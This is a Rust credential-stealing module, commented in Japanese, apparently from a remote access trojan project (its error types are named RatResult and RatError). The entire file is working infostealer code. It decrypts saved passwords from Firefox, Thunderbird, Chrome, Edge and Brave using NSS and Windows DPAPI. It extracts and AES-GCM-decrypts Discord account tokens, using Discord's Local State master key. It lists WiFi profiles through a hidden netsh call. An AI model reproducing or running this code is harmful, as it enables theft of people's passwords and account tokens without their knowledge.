// 認証データ収集モジュール
use serde::{Serialize, Deserialize};
use crate::{RatResult, RatError, Config};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AuthData {
    pub passwords: Vec<String>,
    pub wifi_creds: Vec<String>,
}

impl Default for AuthData {
    fn default() -> Self {
        Self {
            passwords: Vec::new(),
            wifi_creds: Vec::new(),
        }
    }
}

// 統合認証データ収集関数
pub fn collect_auth_data_with_config(config: &Config) -> AuthData {
    let mut auth_data = AuthData::default();
    
    // ブラウザパスワード収集
    if config.collect_browser_passwords {
        auth_data.passwords.extend(collect_browser_passwords());
    }
    
    // Discord トークン収集
    if config.collect_discord_tokens {
        match collect_discord_tokens() {
            Ok(mut tokens) => auth_data.passwords.append(&mut tokens),
            Err(e) => auth_data.passwords.push(format!("Discord token error: {}", e)),
        }
    }
    
    // WiFi 認証情報収集
    if config.collect_wifi_passwords {
        auth_data.wifi_creds.extend(collect_wifi_credentials());
    }
    
    auth_data
}

// 簡素化されたブラウザパスワード収集
#[cfg(feature = "browser")]
fn collect_browser_passwords() -> Vec<String> {
    let mut passwords = Vec::new();
    
    // 統合ブラウザスキャン
    match crate::collectors::browser_scanner::collect_browser_passwords_simple() {
        Ok(browser_passwords) => {
            println!("🔍 Browser scan found {} entries", browser_passwords.len());
            passwords.extend(browser_passwords);
        }
        Err(e) => {
            println!("❌ Browser scan failed: {}", e);
            passwords.push(format!("Browser scan error: {}", e));
        }
    }
    
    // Firefox/Thunderbird 専用スキャン
    if let Ok(mut firefox_passwords) = collect_firefox_passwords() {
        println!("🦊 Firefox scan found {} entries", firefox_passwords.len());
        passwords.append(&mut firefox_passwords);
    }
    
    // Chromium 専用スキャン
    if let Ok(mut chromium_passwords) = collect_chromium_passwords() {
        println!("🌐 Chromium scan found {} entries", chromium_passwords.len());
        passwords.append(&mut chromium_passwords);
    }
    
    if passwords.is_empty() {
        vec!["No browser passwords found".to_string()]
    } else {
        println!("✅ Total browser passwords collected: {}", passwords.len());
        passwords
    }
}

#[cfg(not(feature = "browser"))]
fn collect_browser_passwords() -> Vec<String> {
    vec!["Browser feature not enabled".to_string()]
}

// Firefox/Thunderbird パスワード収集
#[cfg(feature = "browser")]
fn collect_firefox_passwords() -> RatResult<Vec<String>> {
    use crate::collectors::password_manager::NssCredentials;
    
    let mut passwords = Vec::new();
    let profiles = get_firefox_profiles()?;
    
    for profile_path in profiles {
        let browser_name = detect_firefox_browser_type(&profile_path);
        let nss = NssCredentials::new(profile_path);
        
        match nss.get_decrypted_logins() {
            Ok(creds) => {
                for cred in creds {
                    passwords.push(format!(
                        "{} - {}: {} / {}",
                        browser_name, cred.hostname, cred.username, cred.password
                    ));
                }
            }
            Err(_) => continue,
        }
    }
    
    Ok(passwords)
}

// Chromiumパスワード収集
#[cfg(feature = "browser")]
fn collect_chromium_passwords() -> RatResult<Vec<String>> {
    let mut passwords = Vec::new();
    let profiles = get_chromium_profiles()?;
    
    for profile_path in profiles {
        let login_data = profile_path.join("Login Data");
        if login_data.exists() {
            if let Ok(mut creds) = extract_chromium_passwords(&login_data) {
                passwords.append(&mut creds);
            }
        }
    }
    
    Ok(passwords)
}

// Discord トークン収集
fn collect_discord_tokens() -> RatResult<Vec<String>> {
    #[cfg(windows)]
    {
        extract_discord_tokens_windows()
    }
    #[cfg(not(windows))]
    {
        Ok(vec!["Discord token extraction only supported on Windows".to_string()])
    }
}

// WiFi 認証情報収集
fn collect_wifi_credentials() -> Vec<String> {
    #[cfg(windows)]
    {
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        
        let mut wifi_creds = Vec::new();
        
        if let Ok(output) = Command::new("netsh")
            .args(["wlan", "show", "profiles"])
            .creation_flags(0x08000000)
            .output()
        {
            let profiles_text = String::from_utf8_lossy(&output.stdout);
            wifi_creds.extend(
                profiles_text
                    .lines()
                    .filter(|line| line.contains("All User Profile"))
                    .filter_map(|line| line.split(':').nth(1))
                    .map(|name| name.trim().to_owned())
                    .filter(|name| !name.is_empty())
            );
        }
        
        wifi_creds
    }
    #[cfg(not(windows))]
    {
        vec!["WiFi credential collection not supported on this platform".to_string()]
    }
}

// ヘルパー関数

#[cfg(feature = "browser")]
fn get_firefox_profiles() -> RatResult<Vec<std::path::PathBuf>> {
    let mut profiles = Vec::new();
    
    if let Some(appdata) = std::env::var_os("APPDATA") {
        let appdata_path = std::path::PathBuf::from(appdata);
        
        // Firefox プロファイル
        let firefox_dir = appdata_path.join("Mozilla").join("Firefox").join("Profiles");
        profiles.extend(scan_firefox_directory(&firefox_dir));
        
        // Thunderbird プロファイル
        let thunderbird_dir = appdata_path.join("Thunderbird").join("Profiles");
        profiles.extend(scan_firefox_directory(&thunderbird_dir));
        
        println!("🔍 Found {} Firefox/Thunderbird profiles", profiles.len());
    }
    
    Ok(profiles)
}

#[cfg(feature = "browser")]
fn scan_firefox_directory(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut profiles = Vec::new();
    
    if dir.exists() {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                if entry.file_type().map_or(false, |ft| ft.is_dir()) {
                    let profile_path = entry.path();
                    if profile_path.join("logins.json").exists() {
                        profiles.push(profile_path);
                    }
                }
            }
        }
    }
    
    profiles
}

#[cfg(feature = "browser")]
fn get_chromium_profiles() -> RatResult<Vec<std::path::PathBuf>> {
    let mut profiles = Vec::new();
    
    if let Some(local_appdata) = std::env::var_os("LOCALAPPDATA") {
        let browsers = [
            "Google\\Chrome\\User Data\\Default",
            "Microsoft\\Edge\\User Data\\Default",
            "BraveSoftware\\Brave-Browser\\User Data\\Default",
        ];
        
        for browser_path in browsers.iter() {
            let profile_path = std::path::PathBuf::from(&local_appdata).join(browser_path);
            if profile_path.exists() {
                profiles.push(profile_path);
            }
        }
    }
    
    Ok(profiles)
}

#[cfg(feature = "browser")]
fn detect_firefox_browser_type(profile_path: &std::path::Path) -> &'static str {
    let path_str = profile_path.to_string_lossy();
    if path_str.contains("Thunderbird") {
        "Thunderbird"
    } else if path_str.contains("Firefox Developer Edition") {
        "Firefox Developer Edition"
    } else if path_str.contains("Firefox Nightly") {
        "Firefox Nightly"
    } else {
        "Firefox"
    }
}

#[cfg(feature = "browser")]
fn extract_chromium_passwords(login_data_path: &std::path::Path) -> RatResult<Vec<String>> {
    use rusqlite::Connection;
    use std::fs;
    
    // データベースファイルをコピー（ロック回避）
    let temp_file = tempfile::NamedTempFile::new()
        .map_err(|e| RatError::Io(e))?;
    fs::copy(login_data_path, temp_file.path())
        .map_err(|e| RatError::Io(e))?;
    
    let conn = Connection::open(temp_file.path())
        .map_err(|e| RatError::Command(format!("SQLite connection failed: {}", e)))?;
    
    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")
        .map_err(|e| RatError::Command(format!("SQLite prepare failed: {}", e)))?;
    
    let mut passwords = Vec::new();
    let rows = stmt.query_map([], |row| {
        Ok((
            row.get::<_, String>(0)?,  // origin_url
            row.get::<_, String>(1)?,  // username_value  
            row.get::<_, Vec<u8>>(2)?, // password_value (encrypted)
        ))
    }).map_err(|e| RatError::Command(format!("SQLite query failed: {}", e)))?;
    
    for row in rows.flatten() {
        let (url, username, encrypted_password) = row;
        if !username.is_empty() && !encrypted_password.is_empty() {
            match decrypt_chromium_password(&encrypted_password) {
                Ok(decrypted_password) => {
                    passwords.push(format!("Chromium - {}: {} / {}", url, username, decrypted_password));
                }
                Err(_) => {
                    passwords.push(format!("Chromium - {}: {} / [ENCRYPTED]", url, username));
                }
            }
        }
    }
    
    Ok(passwords)
}

#[cfg(all(feature = "browser", windows))]
fn decrypt_chromium_password(encrypted_data: &[u8]) -> RatResult<String> {
    use windows::Win32::Security::Cryptography::{
        CryptUnprotectData, CRYPT_INTEGER_BLOB,
    };
    use windows::Win32::Foundation::{HLOCAL, LocalFree};
    use std::ptr;
    
    if encrypted_data.len() < 16 || encrypted_data.starts_with(b"v10") || encrypted_data.starts_with(b"v11") {
        return Err(RatError::Encryption("Unsupported encryption format".to_string()));
    }
    
    let mut input_blob = CRYPT_INTEGER_BLOB {
        cbData: encrypted_data.len() as u32,
        pbData: encrypted_data.as_ptr() as *mut u8,
    };
    
    let mut output_blob = CRYPT_INTEGER_BLOB {
        cbData: 0,
        pbData: ptr::null_mut(),
    };
    
    let result = unsafe {
        CryptUnprotectData(
            &mut input_blob,
            None,
            None,
            None,
            None,
            0,
            &mut output_blob,
        )
    };
    
    if result.is_err() {
        return Err(RatError::Encryption("DPAPI decryption failed".to_string()));
    }
    
    let password = unsafe {
        let slice = std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
        
        // UTF-8として試行
        let password = if let Ok(utf8_str) = std::str::from_utf8(slice) {
            utf8_str.trim_end_matches('\0').to_string()
        } else {
            // UTF-16として試行 (Windowsの一般的な文字エンコーディング)
            if slice.len() % 2 == 0 {
                let utf16_slice = std::slice::from_raw_parts(slice.as_ptr() as *const u16, slice.len() / 2);
                String::from_utf16_lossy(utf16_slice).trim_end_matches('\0').to_string()
            } else {
                // 最後の手段としてUTF-8 lossyを使用
                String::from_utf8_lossy(slice).trim_end_matches('\0').to_string()
            }
        };
        
        // メモリを解放
        if !output_blob.pbData.is_null() {
            LocalFree(Some(HLOCAL(output_blob.pbData as *mut _ as _)));
        }
        
        password
    };
    
    Ok(password)
}

#[cfg(not(all(feature = "browser", windows)))]
fn decrypt_chromium_password(_encrypted_data: &[u8]) -> RatResult<String> {
    Err(RatError::Encryption("DPAPI not available on this platform".to_string()))
}

#[cfg(windows)]
fn extract_discord_tokens_windows() -> RatResult<Vec<String>> {
    let mut tokens = Vec::new();
    let mut successful_extractions = 0;
    
    // 1. 高度な復号化を試行
    if let Ok(decrypted_tokens) = extract_discord_with_decryption() {
        tokens.extend(decrypted_tokens);
        successful_extractions = tokens.len();
    }
    
    // 2. フォールバック: 手動パターンマッチング
    if successful_extractions == 0 {
        if let Ok(pattern_tokens) = extract_discord_with_patterns() {
            tokens.extend(pattern_tokens);
            successful_extractions = tokens.len();
        }
    }
    
    // 結果の整理
    if successful_extractions > 0 {
        tokens.push(format!("✅ Discord: {} tokens extracted", successful_extractions));
    } else {
        tokens.push("Discord: No valid tokens found".to_string());
    }
    
    Ok(tokens)
}

// 高度なDiscordトークン抽出（DPAPI + AES復号化）
#[cfg(windows)]
fn extract_discord_with_decryption() -> RatResult<Vec<String>> {
    let discord_dir = find_discord_directory()?;
    let master_key = get_discord_master_key(&discord_dir.join("Local State"))?;
    let ldb_files = find_all_discord_ldb_files(&discord_dir)?;
    
    let mut tokens = Vec::new();
    
    for ldb_path in ldb_files {
        if let Ok(ldb_data) = std::fs::read(&ldb_path) {
            let ldb_content = String::from_utf8_lossy(&ldb_data);
            let encrypted_tokens = extract_discord_encrypted_tokens(&ldb_content);
            
            for encrypted_token in encrypted_tokens {
                if let Ok(decrypted) = decrypt_discord_token(&master_key, &encrypted_token) {
                    tokens.push(format!("Discord Token: {}", decrypted));
                }
            }
        }
    }
    
    if tokens.is_empty() { 
        Err(RatError::Config("No decrypted tokens found".to_string()))
    } else { 
        Ok(tokens) 
    }
}

// フォールバック: 手動パターンマッチング
#[cfg(windows)]
fn extract_discord_with_patterns() -> RatResult<Vec<String>> {
    let discord_path = get_config_dir()?.join("discord");
    if !discord_path.exists() {
        return Err(RatError::Config("Discord directory not found".to_string()));
    }
    
    let mut tokens = Vec::new();
    let leveldb_path = discord_path.join("Local Storage").join("leveldb");
    
    if let Ok(entries) = std::fs::read_dir(&leveldb_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().map_or(false, |ext| ext == "ldb") {
                if let Ok(content) = std::fs::read(&path) {
                    let content_str = String::from_utf8_lossy(&content);
                    
                    // 統合されたトークン検索
                    for token_fn in [find_mfa_token, find_normal_token, find_json_token] {
                        if let Some(token) = token_fn(&content_str) {
                            tokens.push(format!("Discord Token: {}", token));
                        }
                    }
                }
            }
        }
    }
    
    // 追加のディレクトリもチェック
    tokens.extend(search_tokens_in_directory(&discord_path.join("Session Storage")).unwrap_or_default());
    
    if tokens.is_empty() { 
        Err(RatError::Config("No pattern tokens found".to_string()))
    } else { 
        Ok(tokens) 
    }
}

fn search_tokens_in_directory(dir_path: &std::path::Path) -> RatResult<Vec<String>> {
    let mut tokens = Vec::new();
    
    if let Ok(entries) = std::fs::read_dir(dir_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Ok(content) = std::fs::read_to_string(&path) {
                    // JSON形式のトークンを検索
                    if content.contains("token") {
                        
                        // 手動でDiscordトークンを検索
                        if let Some(token) = find_json_token(&content) {
                            tokens.push(format!("Discord Token (JSON): {}", token));
                        }
                        
                        if let Some(token) = find_mfa_token(&content) {
                            tokens.push(format!("Discord Token (MFA): {}", token));
                        }
                        
                        if let Some(token) = find_normal_token(&content) {
                            tokens.push(format!("Discord Token (Normal): {}", token));
                        }
                    }
                }
            }
        }
    }
    
    Ok(tokens)
}

fn find_mfa_token(content: &str) -> Option<String> {
    let mut i = 0;
    let chars: Vec<char> = content.chars().collect();
    
    while i < chars.len() - 4 {
        if chars[i] == 'm' && chars[i+1] == 'f' && chars[i+2] == 'a' && chars[i+3] == '.' {
            let start = i;
            let mut j = i + 4;
            
            // MFAトークンは約88文字
            while j < chars.len() && j < start + 100 {
                let c = chars[j];
                if !c.is_alphanumeric() && c != '_' && c != '-' {
                    break;
                }
                j += 1;
            }
            
            if j - start >= 88 {
                let token: String = chars[start..j].iter().collect();
                return Some(token);
            }
        }
        i += 1;
    }
    None
}

fn find_normal_token(content: &str) -> Option<String> {
    let mut i = 0;
    let chars: Vec<char> = content.chars().collect();
    
    while i < chars.len() - 50 {
        // 24文字の数字・文字で始まる部分を探す
        if chars[i].is_alphanumeric() {
            let start = i;
            let mut dot_count = 0;
            let mut j = i;
            
            while j < chars.len() && j < start + 100 {
                let c = chars[j];
                if c == '.' {
                    dot_count += 1;
                    if dot_count > 2 { break; }
                } else if !c.is_alphanumeric() && c != '_' && c != '-' {
                    break;
                }
                j += 1;
            }
            
            if dot_count == 2 && j - start >= 50 {
                let token: String = chars[start..j].iter().collect();
                return Some(token);
            }
        }
        i += 1;
    }
    None
}

fn find_json_token(content: &str) -> Option<String> {
    if let Some(start) = content.find("\"token\":\"") {
        let token_start = start + 9; // "token":"の長さ
        if let Some(end) = content[token_start..].find('"') {
            let token = &content[token_start..token_start + end];
            return Some(token.to_string());
        }
    }
    None
}

// 使用しないため削除

fn get_config_dir() -> RatResult<std::path::PathBuf> {
    #[cfg(windows)]
    {
        use windows::Win32::System::Com::CoTaskMemFree;
        use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_RoamingAppData, KF_FLAG_DEFAULT};

        // SHGetKnownFolderPath returns a CoTaskMem-allocated PWSTR; free with CoTaskMemFree
        let pw = unsafe { SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KF_FLAG_DEFAULT, None) }
            .map_err(|e| RatError::Config(format!("Failed to get RoamingAppData: {}", e)))?;
        // Convert to String and free the memory
        let path_string = unsafe { pw.to_string() }.map_err(|_| RatError::Config("Invalid UTF-16 path".to_string()))?;
        unsafe { CoTaskMemFree(Some(pw.0 as _)); }
        Ok(std::path::PathBuf::from(path_string))
    }
    #[cfg(not(windows))]
    {
        std::env::var("HOME")
            .map(|home| std::path::PathBuf::from(home).join(".config"))
            .map_err(|_| RatError::Config("HOME not found".to_string()))
    }
}

#[cfg(not(feature = "browser"))]
fn collect_firefox_passwords() -> RatResult<Vec<String>> {
    Ok(vec!["Browser feature not enabled".to_string()])
}

#[cfg(not(feature = "browser"))]
fn collect_chromium_passwords() -> RatResult<Vec<String>> {
    Ok(vec!["Browser feature not enabled".to_string()])
}

// =====================================================
// 高度なDiscordトークン抽出機能
// =====================================================

use std::ffi::c_void;
use std::ptr;

// Windows DPAPI FFI定義
#[cfg(windows)]
#[link(name = "crypt32")]
extern "system" {
    fn CryptUnprotectData(
        pDataIn: *const DataBlob,
        ppszDataDescr: *mut *mut u16,
        pOptionalEntropy: *const DataBlob,
        pvReserved: *mut c_void,
        pPromptStruct: *mut c_void,
        dwFlags: u32,
        pDataOut: *mut DataBlob,
    ) -> i32;
}

#[cfg(windows)]
#[link(name = "kernel32")]
extern "system" {
    fn LocalFree(hMem: *mut c_void) -> *mut c_void;
}

#[cfg(windows)]
#[repr(C)]
struct DataBlob {
    cb_data: u32,
    pb_data: *mut u8,
}

#[cfg(windows)]
const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;

// Discordディレクトリを検出
fn find_discord_directory() -> RatResult<std::path::PathBuf> {
    let config_dir = get_config_dir()?;
    let discord_path = config_dir.join("discord");
    
    if !discord_path.exists() {
        return Err(RatError::Config(format!("Discord directory not found: {}", discord_path.display())));
    }
    
    Ok(discord_path)
}

// DPAPIでデータを復号化
#[cfg(windows)]
fn dpapi_unprotect(data: &[u8]) -> RatResult<Vec<u8>> {
    unsafe {
        let in_blob = DataBlob {
            cb_data: data.len() as u32,
            pb_data: data.as_ptr() as *mut u8,
        };
        let mut out_blob = DataBlob {
            cb_data: 0,
            pb_data: ptr::null_mut(),
        };
        
        let result = CryptUnprotectData(
            &in_blob,
            ptr::null_mut(),
            ptr::null(),
            ptr::null_mut(),
            ptr::null_mut(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut out_blob,
        );
        
        if result != 0 {
            let slice = std::slice::from_raw_parts(out_blob.pb_data, out_blob.cb_data as usize);
            let decrypted_data = slice.to_vec();
            LocalFree(out_blob.pb_data as *mut c_void);
            Ok(decrypted_data)
        } else {
            Err(RatError::Config("DPAPI decryption failed".to_string()))
        }
    }
}

#[cfg(not(windows))]
fn dpapi_unprotect(_data: &[u8]) -> RatResult<Vec<u8>> {
    Err(RatError::Config("DPAPI not available on non-Windows".to_string()))
}

// Local StateからDiscordのマスターキーを取得
fn get_discord_master_key(local_state_path: &std::path::Path) -> RatResult<Vec<u8>> {
    let json_content = std::fs::read_to_string(local_state_path)
        .map_err(|_| RatError::Config("Failed to read Local State".to_string()))?;
    
    let v: serde_json::Value = serde_json::from_str(&json_content)
        .map_err(|_| RatError::Config("Failed to parse Local State JSON".to_string()))?;
    
    let encrypted_key_b64 = v["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or_else(|| RatError::Config("Encrypted key not found in Local State".to_string()))?;
    
    let encrypted_key = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, encrypted_key_b64)
        .map_err(|_| RatError::Config("Failed to decode encrypted key".to_string()))?;
    
    if !encrypted_key.starts_with(b"DPAPI") {
        return Err(RatError::Config("Invalid key format (missing DPAPI prefix)".to_string()));
    }
    
    let master_key = dpapi_unprotect(&encrypted_key[5..])?;
    Ok(master_key)
}

// すべてのLDBファイルを検索
fn find_all_discord_ldb_files(discord_dir: &std::path::Path) -> RatResult<Vec<std::path::PathBuf>> {
    let leveldb_path = discord_dir.join("Local Storage").join("leveldb");
    if !leveldb_path.exists() {
        return Err(RatError::Config(format!("LevelDB directory not found: {}", leveldb_path.display())));
    }
    
    let mut ldb_files = Vec::new();
    collect_ldb_files_recursive(&leveldb_path, &mut ldb_files)?;
    
    if ldb_files.is_empty() {
        return Err(RatError::Config("No LDB files found".to_string()));
    }
    
    ldb_files.sort();
    Ok(ldb_files)
}

// 再帰的にLDBファイルを収集
fn collect_ldb_files_recursive(dir: &std::path::Path, ldb_files: &mut Vec<std::path::PathBuf>) -> RatResult<()> {
    let entries = std::fs::read_dir(dir)
        .map_err(|_| RatError::Config(format!("Failed to read directory: {}", dir.display())))?;
    
    for entry in entries {
        let entry = entry.map_err(|_| RatError::Config("Failed to read directory entry".to_string()))?;
        let path = entry.path();
        
        if path.is_dir() {
            collect_ldb_files_recursive(&path, ldb_files)?;
        } else if path.extension().map_or(false, |ext| ext == "ldb") {
            ldb_files.push(path);
        }
    }
    
    Ok(())
}

// LDBファイルから暗号化されたトークンを抽出
fn extract_discord_encrypted_tokens(ldb_content: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let pattern = "dQw4w9WgXcQ:";
    let mut start = 0;
    
    while let Some(pos) = ldb_content[start..].find(pattern) {
        let token_start = start + pos + pattern.len();
        let remaining = &ldb_content[token_start..];
        
        // トークンの終端を探す
        let token_end = remaining
            .find(|c: char| c == '"' || c == '\0' || c == '\n' || c == '\r' || c.is_control())
            .unwrap_or(remaining.len());
        
        if token_end > 20 {
            let token = &remaining[..token_end];
            // Base64形式かチェック
            if token.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=') {
                tokens.push(token.to_string());
            }
        }
        
        start = token_start + token_end;
    }
    
    tokens
}

// 暗号化されたトークンを復号化
fn decrypt_discord_token(master_key: &[u8], encrypted_b64: &str) -> RatResult<String> {
    use aes_gcm::{Aes256Gcm, Nonce, aead::{Aead, KeyInit}};
    
    let data = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, encrypted_b64)
        .map_err(|_| RatError::Config("Failed to decode encrypted token".to_string()))?;
    
    if data.len() < 15 + 16 {
        return Err(RatError::Config(format!("Invalid encrypted token length: {}", data.len())));
    }
    
    // v10プレフィックス(3バイト) + IV(12バイト) + 暗号化データ + タグ(16バイト)
    let iv = &data[3..15];
    let ciphertext = &data[15..data.len() - 16];
    let tag = &data[data.len() - 16..];
    
    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|_| RatError::Config("Failed to create AES cipher".to_string()))?;
    
    let mut data_with_tag = ciphertext.to_vec();
    data_with_tag.extend_from_slice(tag);
    
    let nonce = Nonce::from_slice(iv);
    
    let plaintext = cipher.decrypt(nonce, data_with_tag.as_ref())
        .map_err(|_| RatError::Config("Failed to decrypt token".to_string()))?;
    
    Ok(String::from_utf8_lossy(&plaintext).to_string())
}
